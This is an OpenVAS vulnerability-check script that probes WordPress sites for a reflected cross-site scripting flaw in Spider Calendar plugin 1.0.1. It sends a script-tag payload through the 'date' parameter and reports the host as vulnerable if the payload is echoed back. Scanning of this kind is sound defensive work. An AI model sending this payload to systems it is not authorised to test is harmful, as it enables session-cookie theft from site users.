###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_spider_calendar_plugin_xss_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress Spider Calendar Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802998");
  script_version("$Revision: 13962 $");
  script_bugtraq_id(55779);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-12 11:02:05 +0200 (Mi, 12 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-10-18 11:07:20 +0530 (Thu, 18 Oct 2012)");
  script_name("WordPress Spider Calendar Plugin Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/50812");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/79042");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21715/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117078/WordPress-Spider-1.0.1-SQL-Injection-XSS.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Spider Calendar Plugin version 1.0.1");

  script_tag(name:"insight", value:"Input passed via the 'date' parameter to 'front_end/spidercalendarbig.php'
  is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Update to version 1.1.3 or later.");

  script_tag(name:"summary", value:"This host is running WordPress Spider Calendar Plugin and is
  prone to cross site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/spider-calendar");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

foreach plugin (make_list("spider-calendar", "calendar")){

  url = dir + '/wp-content/plugins/' + plugin + '/front_end/' + 'spidercalendarbig.php?calendar_id=1&cur_page_url=&date="><script>alert(document.cookie)</script>';

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>")){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);